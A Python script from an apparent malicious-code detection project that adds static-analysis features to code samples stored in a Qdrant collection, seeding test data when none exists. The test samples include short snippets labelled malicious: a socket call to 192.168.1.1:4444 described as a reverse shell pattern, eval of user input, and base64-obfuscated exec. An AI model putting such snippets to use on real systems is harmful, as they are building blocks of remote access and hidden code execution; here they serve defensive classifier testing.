#!/usr/bin/env python3
"""
Add features to existing Qdrant samples WITHOUT heavy dependencies.

This script:
1. Creates collection with test samples if it doesn't exist
2. Loads samples from Qdrant (they have code but no features)
3. Extracts features for each sample
4. Updates Qdrant points in-place with features

Usage:
    python scripts/add_features_to_qdrant.py --limit 100  # Test
    python scripts/add_features_to_qdrant.py              # All samples
"""

import sys
import os
import argparse
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from dotenv import load_dotenv
load_dotenv()

from qdrant_client import QdrantClient, models
from scriptguard.config_loader import load_raw_config
from scriptguard.steps.feature_extraction import (
    extract_ast_features,
    calculate_entropy,
    extract_api_patterns,
    extract_string_features
)


def create_test_collection(client: QdrantClient, collection_name: str, config: dict):
    """Create collection with test samples if it doesn't exist."""
    print(f"\n⚠️  Collection '{collection_name}' doesn't exist!")
    print("Creating test collection with sample data...")

    # Get embedding config
    embedding_config = config.get("code_embedding", {})
    embedding_model = embedding_config.get("model", "microsoft/unixcoder-base")

    # Determine vector size based on model
    if "unixcoder" in embedding_model.lower():
        vector_size = 768
    elif "jina" in embedding_model.lower():
        vector_size = 1024
    else:
        vector_size = 768  # Default

    print(f"  Model: {embedding_model}")
    print(f"  Vector size: {vector_size}")

    # Create collection
    client.create_collection(
        collection_name=collection_name,
        vectors_config=models.VectorParams(
            size=vector_size,
            distance=models.Distance.COSINE
        )
    )
    print(f"✓ Created collection '{collection_name}'")

    # Create test samples
    test_samples = [
        {
            "code": "print('Hello, World!')",
            "label": "benign",
            "description": "Simple hello world"
        },
        {
            "code": "import os\nos.system('ls -la')",
            "label": "benign",
            "description": "Basic file listing"
        },
        {
            "code": "import socket\ns = socket.socket()\ns.connect(('192.168.1.1', 4444))\nos.system('whoami')",
            "label": "malicious",
            "description": "Reverse shell pattern"
        },
        {
            "code": "eval(input('Enter code: '))",
            "label": "malicious",
            "description": "Dangerous eval usage"
        },
        {
            "code": "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))",
            "label": "malicious",
            "description": "Obfuscated execution"
        }
    ]

    print(f"\nAdding {len(test_samples)} test samples...")

    # We need to vectorize these samples, but we don't want to import heavy dependencies
    # So we'll create dummy vectors (zeros) - just for testing feature extraction
    import numpy as np

    points = []
    for i, sample in enumerate(test_samples):
        point_id = i + 1
        dummy_vector = np.zeros(vector_size).tolist()

        points.append(models.PointStruct(
            id=point_id,
            vector=dummy_vector,
            payload={
                "code": sample["code"],
                "label": sample["label"],
                "db_id": point_id,
                "code_preview": sample["code"][:200],
                "description": sample["description"]
            }
        ))

    client.upsert(
        collection_name=collection_name,
        points=points
    )

    print(f"✓ Added {len(test_samples)} test samples to collection")
    print("\n⚠️  NOTE: These are TEST SAMPLES with dummy vectors!")
    print("   To populate with real data, run the full pipeline:")
    print("   python -m scriptguard.pipelines.train_pipeline")
    print()


def extract_features_for_sample(code: str) -> dict:
    """Extract all features for a code sample."""
    try:
        ast_features = extract_ast_features(code)
        entropy = calculate_entropy(code)
        api_patterns = extract_api_patterns(code)
        string_features = extract_string_features(code)

        return {
            # Complexity metrics
            "complexity_score": ast_features.get("complexity_score", 0),
            "entropy": entropy,
            "code_length": len(code),
            "code_lines": code.count("\n") + 1,

            # Dangerous patterns
            "dangerous_api_calls": ast_features.get("dangerous_patterns", []),
            "suspicious_combinations": api_patterns.get("suspicious_combinations", []),

            # API usage flags
            "has_network_api": len(api_patterns.get("network_apis", [])) > 0,
            "has_file_api": len(api_patterns.get("file_apis", [])) > 0,
            "has_process_api": len(api_patterns.get("process_apis", [])) > 0,
            "has_crypto_api": len(api_patterns.get("crypto_apis", [])) > 0,

            # String patterns
            "has_urls": string_features.get("has_urls", False),
            "has_ips": string_features.get("has_ips", False),
            "has_base64": string_features.get("has_base64", False),
            "has_hex": string_features.get("has_hex", False),

            # Detailed arrays (for analysis)
            "network_apis": api_patterns.get("network_apis", []),
            "file_apis": api_patterns.get("file_apis", []),
            "process_apis": api_patterns.get("process_apis", []),
            "crypto_apis": api_patterns.get("crypto_apis", []),
            "imports": ast_features.get("imports", []),
            "function_calls": ast_features.get("function_calls", []),
            "suspicious_strings": string_features.get("suspicious_strings", [])
        }
    except Exception as e:
        print(f"  ⚠️  Feature extraction failed: {e}")
        # Return empty features on error
        return {
            "complexity_score": 0,
            "entropy": 0.0,
            "code_length": len(code),
            "code_lines": code.count("\n") + 1,
            "dangerous_api_calls": [],
            "suspicious_combinations": [],
            "has_network_api": False,
            "has_file_api": False,
            "has_process_api": False,
            "has_crypto_api": False,
            "has_urls": False,
            "has_ips": False,
            "has_base64": False,
            "has_hex": False,
            "network_apis": [],
            "file_apis": [],
            "process_apis": [],
            "crypto_apis": [],
            "imports": [],
            "function_calls": [],
            "suspicious_strings": []
        }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, help="Number of samples to process")
    parser.add_argument("--collection", type=str, default="code_samples", help="Collection name")
    parser.add_argument("--batch-size", type=int, default=100, help="Scroll batch size")
    args = parser.parse_args()

    print("=" * 70)
    print("ADD FEATURES TO QDRANT SAMPLES")
    print("=" * 70)
    print(f"Collection: {args.collection}")
    if args.limit:
        print(f"Limit: {args.limit} samples")
    else:
        print("Processing: ALL samples")

    # Connect to Qdrant
    print("\n1. Connecting to Qdrant...")
    api_key = os.getenv("QDRANT_API_KEY")
    client_kwargs = {
        "host": "localhost",
        "port": 6333,
        "https": False,
        "timeout": 60
    }
    if api_key:
        client_kwargs["api_key"] = api_key

    client = QdrantClient(**client_kwargs)
    print("✓ Connected to Qdrant")

    # Load config
    config = load_raw_config("config.yaml")

    # Get collection info or create if doesn't exist
    try:
        collection_info = client.get_collection(args.collection)
        total_points = collection_info.points_count
        print(f"  Total points in collection: {total_points:,}")
    except Exception as e:
        if "doesn't exist" in str(e) or "Not found" in str(e):
            # Collection doesn't exist - create test collection
            create_test_collection(client, args.collection, config)
            # Get collection info again
            collection_info = client.get_collection(args.collection)
            total_points = collection_info.points_count
            print(f"  Total points in collection: {total_points:,}")
        else:
            print(f"❌ Failed to get collection info: {e}")
            return 1

    # Load samples from Qdrant
    print(f"\n2. Loading samples from Qdrant...")
    samples = []
    offset = None
    processed_count = 0

    while True:
        # Determine batch size for this scroll
        if args.limit:
            remaining = args.limit - len(samples)
            if remaining <= 0:
                break
            batch_size = min(args.batch_size, remaining)
        else:
            batch_size = args.batch_size

        try:
            results = client.scroll(
                collection_name=args.collection,
                limit=batch_size,
                offset=offset,
                with_payload=True,
                with_vectors=False
            )
        except Exception as e:
            print(f"❌ Error scrolling Qdrant: {e}")
            break

        points, next_offset = results
        if not points:
            break

        for point in points:
            payload = point.payload

            # Try to get code from different fields
            code = (
                payload.get("code") or
                payload.get("content") or
                payload.get("code_preview", "")
            )

            # Process all samples that have code
            if code:
                has_features = payload.get("features") is not None
                samples.append({
                    "id": point.id,
                    "code": code,
                    "label": payload.get("label", "unknown"),
                    "db_id": payload.get("db_id"),
                    "has_features": has_features
                })

        offset = next_offset
        if offset is None:
            break

    print(f"✓ Loaded {len(samples):,} samples")

    # Check which already have features
    with_features = sum(1 for s in samples if s["has_features"])
    without_features = len(samples) - with_features
    print(f"  Already with features: {with_features:,}")
    print(f"  Need features: {without_features:,}")

    if without_features == 0:
        print("\n✅ All samples already have features!")
        return 0

    # Extract features
    print(f"\n3. Extracting features for {without_features:,} samples...")
    features_added = 0
    features_failed = 0

    for i, sample in enumerate(samples, 1):
        # Skip if already has features
        if sample["has_features"]:
            continue

        if (i % 100 == 0) or (i == len(samples)):
            print(f"  Progress: {i:,}/{len(samples):,} ({i/len(samples)*100:.1f}%)...")

        # Extract features
        try:
            features = extract_features_for_sample(sample["code"])

            # Update Qdrant point with features
            client.set_payload(
                collection_name=args.collection,
                payload={"features": features},
                points=[sample["id"]]
            )

            features_added += 1

        except Exception as e:
            print(f"  ⚠️  Failed to process sample {sample['id']}: {e}")
            features_failed += 1

    print(f"\n✓ Feature extraction complete")
    print(f"  Features added: {features_added:,}")
    print(f"  Failed: {features_failed:,}")

    # Verify
    print(f"\n4. Verifying features...")
    verify_results = client.scroll(
        collection_name=args.collection,
        limit=5,
        with_payload=True
    )

    verified_count = 0
    for point in verify_results[0]:
        if point.payload.get("features"):
            verified_count += 1
            features = point.payload["features"]
            entropy = features.get("entropy", 0)
            complexity = features.get("complexity_score", 0)
            print(f"  ✓ Point {point.id}: entropy={entropy:.2f}, complexity={complexity}")

    print(f"\n{'='*70}")
    if verified_count > 0:
        print(f"✅ SUCCESS: {verified_count}/5 verified samples have features!")
        print(f"\nAdded features to {features_added:,} samples")

        if args.limit:
            print(f"\nThis was a test run (--limit {args.limit})")
            print(f"To update ALL samples, run:")
            print(f"  python scripts/add_features_to_qdrant.py")
        else:
            print(f"\nNext steps:")
            print(f"  1. Run: python scripts/analyze_features.py")
            print(f"  2. Verify 100% coverage")
            print(f"  3. Test hybrid search")
    else:
        print(f"❌ FAILURE: Features were not stored!")
    print("=" * 70)

    return 0 if verified_count > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
